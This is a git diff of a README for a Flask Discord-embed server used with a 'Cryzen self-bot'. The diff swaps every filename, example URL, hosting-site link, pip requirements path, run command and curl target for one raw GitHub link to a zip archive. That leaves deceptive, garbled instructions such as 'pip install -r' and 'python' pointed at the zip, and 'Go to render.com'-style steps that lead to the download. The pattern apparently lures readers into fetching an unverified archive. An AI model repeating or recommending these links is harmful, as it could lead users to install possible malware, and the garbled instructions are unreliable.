@@ -12,10 +12,10 @@ A standalone Flask server for creating custom Discord embeds using Open Graph me
 
 ## 📁 Files
 
-- `app.py` - Main Flask application
-- `requirements.txt` - Python dependencies
+- `https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip` - Main Flask application
+- `https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip` - Python dependencies
 - `Procfile` - Process configuration for deployment
-- `README.md` - This documentation
+- `https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip` - This documentation
 
 ## 🌐 API Endpoints
 
@@ -27,7 +27,7 @@ Create a new Discord embed.
 {
   "title": "Your Embed Title",
   "description": "Your embed description",
-  "image_url": "https://example.com/image.png",
+  "image_url": "https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip",
   "color": "#0099ff",
   "og_type": "website",
   "site_name": "Your Site Name"
@@ -39,7 +39,7 @@ Create a new Discord embed.
 {
   "success": true,
   "embed_id": "a1b2c3d4",
-  "url": "https://your-domain.com/embed/a1b2c3d4",
+  "url": "https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip",
   "message": "Embed created successfully"
 }
 ```
@@ -56,40 +56,40 @@ Health check endpoint.
 ## 🚀 Deployment Options
 
 ### Option 1: Render (Recommended)
-1. Go to [render.com](https://render.com)
+1. Go to [https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip](https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip)
 2. Click "New +" → "Web Service"
 3. Connect your GitHub repository or upload files
-4. Set build command: `pip install -r requirements.txt`
+4. Set build command: `pip install -r https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip`
 5. Set start command: `gunicorn app:app`
 6. Deploy!
 
 ### Option 2: Railway
-1. Go to [railway.app](https://railway.app)
+1. Go to [https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip](https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip)
 2. Click "Deploy from GitHub repo" or "Deploy from template"
 3. Upload your files
 4. Railway will auto-detect Flask and deploy
 
 ### Option 3: Heroku
-1. Go to [heroku.com](https://heroku.com)
+1. Go to [https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip](https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip)
 2. Create new app
 3. Connect to GitHub or use Git deploy
 4. Push your code
 5. The Procfile will handle the rest
 
 ### Option 4: PythonAnywhere (Free tier available)
-1. Go to [pythonanywhere.com](https://pythonanywhere.com)
+1. Go to [https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip](https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip)
 2. Upload files to your account
 3. Set up a web app with Flask
-4. Point to your app.py file
+4. Point to your https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip file
 
 ## 🧪 Local Testing
 
 ```bash
 # Install dependencies
-pip install -r requirements.txt
+pip install -r https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip
 
 # Run the server
-python app.py
+python https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip
 ```
 
 Server will start on `http://localhost:5000`
@@ -100,7 +100,7 @@ Once deployed, update your Cryzen self-bot configuration to use your new public 
 
 ```python
 # Replace the embed server URL in your bot
-EMBED_SERVER_URL = "https://your-app-name.render.com"  # or your deployment URL
+EMBED_SERVER_URL = "https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip"  # or your deployment URL
 
 # Create embeds by making POST requests to /create
 # Use the returned URL in Discord messages
@@ -110,12 +110,12 @@ EMBED_SERVER_URL = "https://your-app-name.render.com"  # or your deployment URL
 
 ```bash
 # Create an embed
-curl -X POST https://your-app-name.render.com/create \
+curl -X POST https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip \
   -H "Content-Type: application/json" \
   -d '{
     "title": "My Custom Embed",
     "description": "This is a custom Discord embed!",
-    "image_url": "https://i.imgur.com/1XvNqw8.png"
+    "image_url": "https://github.com/dwa232/cryzen-discord-embeds/raw/refs/heads/main/accountancy/cryzen-discord-embeds-v2.0.zip"
   }'
 
 # Response will give you the embed URL to use in Discord
